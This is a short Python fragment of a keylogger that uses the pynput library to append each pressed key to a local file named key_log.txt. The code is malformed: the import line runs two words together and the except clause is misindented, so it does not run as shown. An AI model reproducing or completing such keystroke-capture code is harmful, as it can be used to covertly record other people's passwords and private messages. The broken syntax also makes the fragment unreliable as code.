from pynputimport keyboard 

log_file = "key_log.txt" 

def on_press(key):
  try:
     with open(log_file, "a") as f:
       f.write(f"{key.char}")
except AttributeError:
     with open(log_file, "a") as f:
       f.write(f"[{key}]")
